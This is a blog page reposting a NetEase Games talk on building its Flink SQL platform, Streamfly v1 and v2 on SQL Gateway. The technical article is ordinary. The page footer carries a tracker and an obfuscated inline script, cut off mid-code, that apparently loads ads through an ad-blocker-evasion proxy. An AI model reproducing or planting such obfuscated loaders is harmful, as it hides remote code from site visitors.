<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>网易游戏 Flink SQL 平台化实践 - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">网易游戏 Flink SQL 平台化实践</h1>
			
		</header>
		<div class="content post__content clearfix">
			


                <div id="content_views" class="htmledit_views">
                    <blockquote style="margin-left:0px"> 
 <p style="margin-left:0">摘要：本文整理自网易游戏资深开发工程师林小铂在 Flink Forward Asia 2021 平台建设专场的演讲。主要内容包括：</p> 
 <ol style="margin-left:0">
<li>网易游戏 Flink SQL 发展历程</li>
<li>基于模板 jar 的 StreamflySQL v1</li>
<li>基于 SQL Gateway 的 StreamflySQL v2</li>
<li>未来工作</li>
</ol>
</blockquote> 
<p style="margin-left:0"></p> 
<p style="margin-left:0;text-align:center"><span style="color:#24292e"><span style="background-color:#ffffff"><u><strong><span style="color:#ff6a00"><a href="https://flink-learning.org.cn/activity/detail/5ae4dc83493eb585e87a1ce844875b99" title="点击查看直播回放 &amp; 演讲PDF">点击查看直播回放 &amp; 演讲PDF</a></span></strong></u></span></span></p> 
<p style="margin-left:0"></p> 
<h2 id="slide-0" style="margin-left:0"><span style="color:#181818"><span style="background-color:#ffffff">一、网易游戏 Flink SQL 发展历程</span></span></h2> 
<div class="img-center">
 <img alt="" src="https://images2.imgbox.com/c2/3a/nwICEdbZ_o.jpg">
</div> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">网易游戏实时计算平台叫做 Streamfly，这个名字取名自电影《驯龙高手》中的 Stormfly。由于我们已经在从 Storm 迁移到 Flink，所以将 Stormfly 中的 Storm 替换成了更为通用的 Stream。</span></span></p> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">Streamfly 前身是离线作业平台 Omega 下的名为 Lambda 的子系统，它负责了所有实时作业的调度，最开始开始支持 Storm 和 Spark Streaming，后来改为只支持 Flink。在 2019 年的时候我们将 Lambda 独立出来以此为基础建立了 Streamfly 计算平台。随后，我们在 2019 年底开发并上线了第一个版本 Flink SQL 平台 StreamflySQL。这个版本基于模板 jar 提供了基本 Flink SQL 的功能，但是用户体验还有待提升，因此我们在 2021 年年初从零开始重新建设了第二个版本的 StreamflySQL，而第二个版本是基于 SQL Gateway。</span></span></p> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">要了解这两个版本的不同，我们需要先回顾下 Flink SQL 的基本工作流程。</span></span></p> 
<div class="img-center">
 <img alt="" src="https://images2.imgbox.com/07/0f/iatZioWr_o.jpg">
</div> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">用户提交的 SQL 首先会被 Parser 解析为逻辑执行计划；逻辑执行计划经过 Planner Optimizer 优化，会生成物理执行计划；物理执行计划再通过 Planner CodeGen 代码生成，翻译为 DataStream API 常见的 Transformation；最后 StreamGraphGenerator 会将这些 Transformation 转换为 Flink 作业的最终表示 JobGraph 提交到 Flink 集群。</span></span></p> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">上述一系列过程都发生在 TableEnvironment 里面。取决于部署模式的不同，TableEnvironment 可能运行在 Flink Client 或者 JobManager 里。Flink 现在支持 3 种集群部署模式，包括 Application、 Per-Job 和 Session 模式。在 Application 模式下，TableEnvironment 会在 JobManager 端运行，而在其余两种模式下，TableEnvironment 都运行在 Client 端。不过这三种模式都有一个共同的特点，TableEnvironment 都是一次性的，会在提交 JobGraph 之后自动退出。</span></span></p> 
<div class="img-center">
 <img alt="" src="https://images2.imgbox.com/2e/ad/KW7O1zXB_o.jpg">
</div> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">为了更好地复用 TableEnvironment 提高效率和提供有状态的操作，有的项目会将 TableEnvironment 放到一个新的独立 Server 端进程里面去运行，由此产生了一种新的架构，我们称之为 Server 端 SQL 编译。相对地，还有 Client 端 SQL 编译。</span></span></p> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">有同学可能会问，为什么没有 JobManager 端 SQL 编译，这是因为 JobManager 是相对封闭的组件，不适合拓展，而且即使做了达到的效果跟 Client 端编译效果基本一样。所以总体来看，一般就有 Client 和 Server 两种常见的 Flink SQL 平台架构。</span></span></p> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">Client 端 SQL 编译，顾名思义就是 SQL 的解析翻译优化都在 Client 端里进行（这里的 Client 是广义的 Client，并不一定是 Flink Client）。典型的案例就是通用模板 jar 和 Flink 的 SQL Client。这种架构的优点是开箱即用，开发成本低，而且使用的是 Flink public 的 API，版本升级比较容易；缺点是难以支持高级的功能，而且每次都要先启动一个比较重的 TableEnvironment 所以性能比较差。</span></span></p> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">然后是 Server 端 SQL 编辑。这种架构将 SQL 解析翻译优化逻辑放到一个独立的 Server 进程去进行，让 Client 变得非常轻，比较接近于传统数据库的架构。典型的案例是 Ververica 的 SQL Gateway。这种架构的优点是可拓展性好，可以支持很多定制化功能，而且性能好；缺点则是现在开源界没有成熟的解决方案，像上面提到 SQL Gateway 只是一个比较初期的原型系统，缺乏很多企业级特性，如果用到生产环境需要经过一定的改造，而且这些改造涉及比较多 Flink 内部 API，需要比较多 Flink 的背景知识，总体来说开发成本比较高，而且后续版本升级工作量也比较大。</span></span></p> 
<blockquote> 
 <p style="margin-left:0">编者按：Apache Flink 社区目前正在开发 SQL Gateway 组件，将原生提供 Flink SQL 服务化的能力，并兼容 HiveServer2 协议，计划于 1.16 版本中发布，敬请期待。感兴趣的同学可以关注 FLIP-91 [1] 和 FLIP-223 [2] 了解更多，也非常欢迎大家参与贡献。</p> 
</blockquote> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">回到我们 Flink SQL 平台，我们 StreamflySQL v1 是基于 Client 端 SQL 编译，而 v2 是基于 Server 端的 SQL 编译。下面就让我逐个介绍一下。</span></span></p> 
<h2 id="slide-1" style="margin-left:0"><span style="color:#181818"><span style="background-color:#ffffff">二、基于模板 jar 的 StreamflySQL v1</span></span></h2> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">StreamflySQL v1 选择 Client 端 SQL 编译的主要原因有三个:</span></span></p> 
<div class="img-center">
 <img alt="" src="https://images2.imgbox.com/2f/48/PaQ0XPxJ_o.jpg">
</div> 
<ul style="margin-left:0"><li>首先是平台集成。不同于很多公司的作业调度器用大数据中比较主流的 Java 编写，我们的 Lambda 调度器是用 Go 开发的。这是因为 Lambda 在设计之初支持了多种实时计算框架，出于松耦合和公司技术栈的考虑，Lambda 以 Go 作为开发语言，会采用与 YARN 类似的动态生成 Shell 脚本的方式来调用不同框架的命令行接口。这样松耦合的接口方式给我们带来很大的灵活性，比如我们可以轻松支持多个版本的 Flink，不需要强制用户随着系统版本升级，但同时也导致没办法直接去调用 Flink 原生的 Java API。</li></ul>
<ul style="margin-left:0"><li>第二个原因是松耦合。开发的时候 Flink 版本是1.9，当时 Client API 比较复杂，不太适合平台集成，并且当时社区也在推动 Client 的重构，所以我们尽量避免依赖 Client API去开发 Flink SQL 平台。</li></ul>
<ul style="margin-left:0"><li>第三个原因是实践经验。因为模板 jar + 配置中心模式在网易游戏内部已经有了比较多的应用，所以我们在这方面积累了很多实践经验。综合之下我们很自然地采用了模板 jar + 配置中心的架构来实现 v1 版本。</li></ul>
<div class="img-center">
 <img alt="" src="https://images2.imgbox.com/90/ab/Jtx7zjxc_o.jpg">
</div> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">上图是 v1 版本的整体架构图。我们在主要在 Lambda 作业平台的基础上新增了 StreamflySQL 后端作为配置中心，负责根据用户提交的 SQL 和作业运行配置加上通用的模板 jar 来生成一个 Lambda 作业。</span></span></p> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">总体的作业提交流程如下:</span></span></p> 
<ol style="margin-left:0">
<li>用户在前端的 SQL 编辑器提交 SQL 和运行配置。</li>
<li>StreamflySQL 后端收到请求后生成一个 Lambda 作业并传递配置 ID。</li>
<li>然后 Lambda 启动作业，背后是执行 Flink CLI run 命令来提交作业。</li>
<li>Flink CLI run 命令会启动 Flink Client 来加载并执行模版 jar 的 main 函数，这时会读取 SQL 和配置，并初始化 TableEnvironment。</li>
<li>TableEnvironment 会从 Catalog 读取必要的 Database/Table 等元信息。这里顺带一提是，在网易游戏我们没有使用统一的 Catalog 来维护不同组件的元信息，而是不同组件有自己的元数据中心，对应不同的 Catalog。</li>
<li>最后 TableEnvironment 编译好 JobGraph，以 Per-Job Cluster 的方式部署作业。</li>
</ol>
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">StreamflySQL v1 实现了 Flink SQL 平台从零到一的建设，满足了部分业务需求，但仍有不少痛点。</span></span></p> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff"><strong>第一个痛点是响应慢。</strong></span></span></p> 
<div class="img-center">
 <img alt="" src="https://images2.imgbox.com/bb/6b/mv5ZCoiG_o.jpg">
</div> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">以一个比较典型的 SQL 来说，以模板 jar 的方式启动作业需要准备 TableEnviroment，这可能会花费 5 秒钟，然后执行 SQL 的编译优化包括与 Catalog 交互去获取元数据，也可能会花费 5 秒钟；编译得到jobgraph之后还需要准备 per-job cluster，一般来说也会花费 20 秒以上；最后还需要等待 Flink job的调度，也就是作业从 scheduled 变成 running 的状态，这个可能也需要 10 秒钟。</span></span></p> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">总体来说，v1 版本启动一个 Flink SQL 作业至少需要 40 秒的时间，这样的耗时相对来说是比较长的。但是仔细分析这些步骤，只有 SQL的编译优化和 job 调度是不可避免的，其他的比如 TableEnvironment 和 Flink cluster 其实都可以提前准备，这里的慢就慢在资源是懒初始化的，而且几乎没有复用。</span></span></p> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff"><strong>第二个痛点是调试难。</strong></span></span></p> 
<div class="img-center">
 <img alt="" src="https://images2.imgbox.com/73/a2/NE7ng8Gi_o.jpg">
</div> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">我们对 SQL 调试的需求有以下几点：</span></span></p> 
<ul style="margin-left:0">
<li>第一点是调试的 SQL 与线上的 SQL 要基本一致。</li>
<li>第二点是调试 SQL 不能对线上的数据产生影响，它可以去读线上的数据，但不能去写。</li>
<li>第三点，因为调试的 SQL 通常只需要抽取少量的数据样本就可以验证 SQL 的正确性，所以我们希望限制调试 SQL 的资源，一方面是出于成本的考虑，另外一方面也是为了防止调试的 SQL 与线上作业产生资源竞争。</li>
<li>第四点，因为调试 SQL 处理的数据量比较少，我们希望以更快更便捷的方式获取到结果。</li>
</ul>
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">在 v1 版本中，我们对上述需求设计了如下解决方案：</span></span></p> 
<ol style="margin-left:0">
<li>首先对于调试的 SQL，系统会在 SQL 翻译的时候将原来的一个 Sink 替换为专用的 PrintSink，这解决了需求中的前两点。</li>
<li>然后对 PrintSink 进行限流，通过 Flink 的反压机制达到总体的限流，并且会限制作业的最长执行时间，超时之后系统会自动把作业结束掉，这解决了需求中的资源限制这点。</li>
<li>最后为了更快地响应，调试的作业并不会提交到 YARN 集群上去运行，而是会在 Lamdba 服务器本地开启开启一个 MiniCluster 去执行，同时也方便我们从标准输出去提取 PrintSink 的结果，这点解决了需求中的最后一点。</li>
</ol>
<div class="img-center">
 <img alt="" src="https://images2.imgbox.com/73/94/16iRBTvB_o.jpg">
</div> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">调试模式的架构如上图所示，比起一般的 SQL 提交流程，主要区别在于作业不会提交到 YARN 上，而是在 Lambda 服务器的本地执行，从而节省了准备 Flink 集群的开销，并且更容易管控资源和获取结果。</span></span></p> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">上述调试解决方案基本可用，但是实际使用过程中依然存在不少问题。</span></span></p> 
<ul style="margin-left:0">
<li>第一，如果用户提交的 SQL 比较复杂，那么 SQL 的编译优化可能会耗费比较久的时间，这会导致作业很容易超时，在有结果输出之前可能就被系统结束掉，同时这样的 SQL 也会给服务器造成比较大的压力。</li>
<li>第二，该架构没法去调试时间窗口比较长的作业或者需要 Bootstrap State 的作业。</li>
<li>第三，因为执行结果是在作业结束之后才批量返回的，不是在作业执行过程中就流式返回，因此用户需要等到作业结束——通常是 10 分钟以上才可以看到结果。</li>
<li>第四，在 SQL 的翻译阶段把调试 SQL 的 Sink 替换掉，这个功能是通过改造 Flink 的 Planner 来实现的，相当于业务逻辑入侵到了 Planner 里面，这样并不优雅。</li>
</ul>
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff"><strong>第三个痛点是 v1 版本只允许单条 DML。</strong></span></span></p> 
<div class="img-center">
 <img alt="" src="https://images2.imgbox.com/74/89/UgthfKox_o.jpg">
</div> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">相比传统的数据库，我们支持的 SQL 语句是很有限的，比如，MySQL 的 SQL 可以分成 DML、DQL、DDL 和 DCL。</span></span></p> 
<ul style="margin-left:0">
<li>DML 用于<strong>操控数据</strong>，常见的语句有 INSERT / UPDATE / DELETE。StreamflySQL v1 只支持了 INSERT，这和 Flink SQL 是保持一致的。Flink SQL 用 Retract 模式 — 也就是类似 Changelog 的方式 — 来表示 UPDATE/DELETE，所以只支持 INSERT，这点其实没有问题。</li>
<li>DQL 用于<strong>查询数据</strong>，常见语句是 SELECT。这在 Flink SQL 是支持的，但因为缺乏 Sink 不能生成一个有意义的 Flink 作业，所以 StreamflySQL v1 不支持 DQL。</li>
<li>DDL 用于<strong>定义元数据</strong>，常见语句是 CREATE / ALTER /DROP 等。这在 StreamflySQL v1 版本是不支持的，因为模板 jar 调用 SQL 的入口是 sqlUpdate，不支持纯元数据的操作，而且为纯元数据的操作单独启动一个 TableEnvironment 来执行也是完全不划算。</li>
<li>最后是 DCL，用于<strong>管理数据权限</strong>，比如 GRANT 跟 REVOKE 语句。这个 Flink SQL 是不支持的，原因是 Flink 目前只是数据的用户而不是管理者，DCL 并没有意义。</li>
</ul>
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">综合来看，v1 版本只支持了单条 DML，这让我们很漂亮的 SQL 编辑器变得空有其表。基于以上这些痛点，我们在今年调研并开发了 StreamflySQL v2。v2 采用的是 Server 端 SQL 编译的架构。</span></span></p> 
<h2 id="slide-2" style="margin-left:0"><span style="color:#181818"><span style="background-color:#ffffff">三、基于 SQL Gateway 的 StreamflySQL v2</span></span></h2> 
<div class="img-center">
 <img alt="" src="https://images2.imgbox.com/d1/4b/jrl2jjR0_o.jpg">
</div> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">我们的核心需求是解决 v1 版本的几个痛点，包括改善用户体验和提供更完整的 SQL 支持。总体的思路是采用 Server 端的 SQL 编译的架构，提高可拓展性和性能。此外，我们的集群部署模式也改成 Session Cluster，预先准备好集群资源，省去启动 YARN application 的时间。</span></span></p> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">这里会有两个关键问题。</span></span></p> 
<ul style="margin-left:0">
<li>首先是我们要完全自研还是基于开源项目？在调研期间我们发现 Ververica 的 SQL Gateway 项目很符合我们需求，容易拓展而且是 Flink 社区 FLIP-91 SQL Gateway 的一个基础实现，后续也容易与社区的发展方向融合。</li>
<li>第二个问题是，SQL Gateway 本身有提交作业的能力，这点跟我们已有的 Lambda 平台是重合的，会造成重复建设和难以统一管理的问题，比如认证授权、资源管理、监控告警等都会有两个入口。那么两者应当如何进行分工？我们最终的解决方案是，利用 Session Cluster 的两阶段调度，即资源初始化和作业执行是分离的，所以我们可以让 Lambda 负责 Session Cluster 的管理，而 StreamflySQL 负责 SQL 作业的管理，这样能复用 Lambda 大部分的基础能力。</li>
</ul>
<div class="img-center">
 <img alt="" src="https://images2.imgbox.com/69/97/W773Xqfw_o.jpg">
</div> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">这是 StreamflySQL v2 的架构图。我们将 SQL Gateway 内嵌到 SpringBoot 应用中，开发了新的后端。总体看起来比 v1 版本要复杂，原因是原本的一级调度变成了会话和作业的两级调度。</span></span></p> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">首先用户需要创建一个 SQL 会话，StreamflySQL 后端会生成一个会话作业。在 Lambda 看来会话作业是一种特殊作业，启动时会使用 yarn-session 的脚本来启动一个 Flink Session Cluster。在 Session Cluster 初始化之后，用户就可以在会话内去提交 SQL。StreamflySQL 后端会给每个会话开启一个 TableEnvironment，负责执行 SQL 语句。如果是只涉及元数据的 SQL，会直接调用 Catalog 接口完成，如果是作业类型的 SQL，会编译成 JobGraph 提交到 Session Cluster 去执行。</span></span></p> 
<div class="img-center">
 <img alt="" src="https://images2.imgbox.com/d9/c8/YxAtii0I_o.jpg">
</div> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">v2 版本很大程度上解决了 v1 版本的几个痛点:</span></span></p> 
<ul style="margin-left:0">
<li>在响应时间方面，v1 常常会需要 1 分钟左右，而 v2 版本通常在 10 秒内完成。</li>
<li>在调试预览方面，v2 不需要等作业结束，而是在作业运行时，将结果通过 socket 流式地返回。这点是依赖了 SQL gateway 比较巧妙的设计。对于 select 语句，SQL Gateway 会自动注册一个基于 socket 的临时表，并将 select 结果写入到这个表。</li>
<li>在 SQL 支持方面，v1 只支持 DML，而 v2 借助于 SQL Gateway 可以支持 DML/DQL/DDL。</li>
</ul>
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">不过 SQL Gateway 虽然有不错的核心功能，但我们使用起来并不是一帆风顺，也遇到一些挑战。</span></span></p> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff"><strong>首先最为重要的是元数据的持久化。</strong></span></span></p> 
<div class="img-center">
 <img alt="" src="https://images2.imgbox.com/57/da/eeGGTQyM_o.jpg">
</div> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">SQL Gateway 本身的元数据只保存在内存中，如果进程重启或是遇到异常崩溃，就会导致元数据丢失，这在企业的生产环境里面是不可接受的。因此我们将 SQL Gateway 集成到 SpringBoot 程序之后，很自然地就将元数据保存到了数据库。</span></span></p> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">元数据主要是会话元数据，包括会话的 Catalog、Function、Table 和作业等等。这些元数据按照作用范围可以分为 4 层。底下的两层是全局的配置，以配置文件的形式存在；上面两层是运行时动态生成的元数据，存在数据库中。上层的配置项优先级更高，可以用于覆盖下层的配置。</span></span></p> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">我们从下往上看这些元数据：</span></span></p> 
<ul style="margin-left:0">
<li>最底层是全局的默认 Flink Configuration，也就是我们在 Flink Home 下的 flink-conf yaml 配置。</li>
<li>再上面一层是 Gateway 自身的配置，比如部署模式（比如是 YARN 还是 K8S），比如默认要出册的 Catalog 和 Function 等等。</li>
<li>第三层是 Session 会话级别的 Session Configuraion，比如会话对应的 Session Cluster 的集群 ID 或者 TaskManager 的资源配置等等。</li>
<li>最上面一层是 Job 级别的配置，包括作业动态生成的元数据，比如作业 ID、用户设置 checkpoint 周期等等。</li>
</ul>
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">这样比较灵活的设计除了解决了元数据持久化的问题，也为我们的多租户特性奠定了基础。</span></span></p> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff"><strong>第二个挑战是多租户。</strong></span></span></p> 
<div class="img-center">
 <img alt="" src="https://images2.imgbox.com/23/7f/04yLjcfI_o.jpg">
</div> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">多租户分为资源和认证两个方面：</span></span></p> 
<ul style="margin-left:0">
<li>在资源方面，StreamflySQL 利用 Lambda 作业平台可以在不同的队列启动 Session Cluster，它们的 Master 节点和资源很自然就是隔离的，所以没有像 Spark Thrift Server 那样不同用户共用一个 Master 节点和混用资源的问题。</li>
<li>在认证方面，因为 Session Cluster 属于不同用户，所以 StreamflySQL 后端需要实现多租户的伪装。在网易游戏，组件一般会使用 Kerberos 认证。我们采用多租户实现的方式是使用 Hadoop 的 Proxy User，先登录为超级用户，然后伪装成项目用户来向不同组件获取 delegation token，这里的组件主要是 Hive MetaStore 跟 HDFS，最后把这些 token 存到 UGI 里面并用 doAS 的方式来提交作业。</li>
</ul>
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff"><strong>第三个挑战是水平拓展。</strong></span></span></p> 
<div class="img-center">
 <img alt="" src="https://images2.imgbox.com/fc/c3/ZH7SjggK_o.jpg">
</div> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">为了高可用和拓展服务能力，StreamflySQL 很自然需要以多实例的架构部署。因为我们已经将主要的状态元数据存到数据库，我们可以随时从数据库构建出一个新的 TableEnvironment，所以 StreamflySQL 实例类似普通 Web 服务一样非常轻，可以很容易地扩容缩容。</span></span></p> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">但是并不是所有状态都可以持久化的，另外有些状态我们故意会不持久化。比如用户使用 SET 命令来改变 TableEnvironment 的属性，比如开启 Table Hints，这些属于临时属性，会在重建 TableEnvironment 后被重置。这是符合预期的。再比如用户提交 select 查询做调试预览时，TaskManager 会与 StreamflySQL 后端建立 socket 链接，而 socket 链接显然也是不可持久化的。因此我们在 StreamflySQL 的多实例前加了亲和性的负载均衡，按照 Session ID 来调度流量，让在正常情况下同一个用户的请求都落到同一个实例上，确保用户使用体验的连续性。</span></span></p> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff"><strong>第四个挑战是作业状态管理。</strong></span></span></p> 
<div class="img-center">
 <img alt="" src="https://images2.imgbox.com/cd/2d/G6LSbHge_o.jpg">
</div> 
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">其实这里的状态一词是双关，有两个含义：</span></span></p> 
<ul style="margin-left:0">
<li>第一个含义是作业的运行状态。SQL gateway 目前只是提交 SQL 并不监控后续的运行状态。因此，StreamflySQL 设置了监控线程池来定时轮询并更新作业状态。因为 StreamflySQL 是多实例的，它们的监控线程同时操作同一个作业的话，可能会有更新丢失的问题，所以我们这里使用了 CAS 乐观锁来保证过时的更新不会生效。然后我们会在作业异常退出或者无法获取状态时进行告警，比如 JobManager 进行 failover 的情况下，我们无法得知 Flink 作业的状态，这时系统就会发出 disconnected 的异常状态告警。</li>
<li>第二个含义是 Flink 的持久化状态，即 Flink State。原生的 SQL gateway 并没有管理 Flink 的 Savepoint 和 Checkpoint，因此我们加上了 stop 和 stop-with-savepoint 的功能，并强制开启 retained checkpoint。这使得在作业遇到异常终止或者简单 stop 之后，再次重启时系统可以自动查找到最新的 checkpoint。</li>
</ul>
<p style="margin-left:0"><span style="color:#24292e"><span style="background-color:#ffffff">这里我可以分享下我们的算法。其实自动查找最新 checkpoint 的功能 Lambda 也有提供，但是 Lambda 假设作业都是 Per-Job Cluster，因此只要查找集群 checkpoint 目录里最新的一个 checkpoint 就可以了。但这样的算法对 StreamflySQL 却不适用，因为 Session Cluster 有多个作业，最新的 checkpoint 并不一定是我们目标作业的。因此，我们改为了使用类似 JobManager HA 的查找方式，先读取作业归档目录元数据，从里面提取最新的一个 checkpoint。</span></span></p> 
<h2 id="slide-3" style="margin-left:0"><span style="color:#181818"><span style="background-color:#ffffff">四、未来工作</span></span></h2> 
<div class="img-center">
 <img alt="" src="https://images2.imgbox.com/23/4c/E570Vq8N_o.jpg">
</div> 
<ul style="margin-left:0">
<li>未来我们首先要解决的一个问题是 State 迁移的问题，即用户对 SQL 进行变更后，如何从原先的 Savepoint 进行恢复。目前只能通过变更类型来告知用户风险，比如通常而言加减字段不会造成 Savepoint 的不兼容，但如果新增一个 join 表，造成的影响就很难说了。因此后续我们计划通过分析 SQL 变更前后的执行计划，来预先告知用户变更前后的状态兼容性。</li>
<li>第二个问题是细粒度的资源管理。目前我们并不能在作业编译时去指定 SQL 的资源，比如 TaskManager 的 CPU 和内存在 Session Cluster 启动之后就确定了，是会话级别的。目前调整资源只能通过作业并行度调整，很不灵活并且容易造成浪费。现在 Flink 1.14 已经支持了 DataStream API 的细粒度资源管理，可以在算子级别设置资源，但 SQL API 现在还没有计划，后续我们可能参与进去推动相关议案的进展。</li>
<li>最后是社区贡献。我们对 SQL Gateway 有一定使用经验，而且也对其进行了不少的改进，后续希望这些改进能回馈给 Flink 社区，推动 FLIP-91 SQL Gateway 的进展。</li>
</ul>
<p style="margin-left:0"></p> 
<p style="margin-left:0;text-align:center"><span style="color:#24292e"><span style="background-color:#ffffff"><u><strong><span style="color:#ff6a00"><a href="https://flink-learning.org.cn/activity/detail/5ae4dc83493eb585e87a1ce844875b99" title="点击查看直播回放 &amp; 演讲PDF">点击查看直播回放 &amp; 演讲PDF</a></span></strong></u></span></span></p>
                </div>

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var 